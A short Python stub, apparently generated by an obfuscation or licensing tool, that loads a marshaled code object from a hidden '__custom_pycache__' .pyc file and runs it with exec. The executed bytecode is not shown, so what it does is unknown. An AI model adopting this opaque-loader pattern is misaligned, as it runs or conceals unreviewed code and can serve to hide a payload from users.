
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'license_fd8fa7e62fd340e5a0c79d942a887c88.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
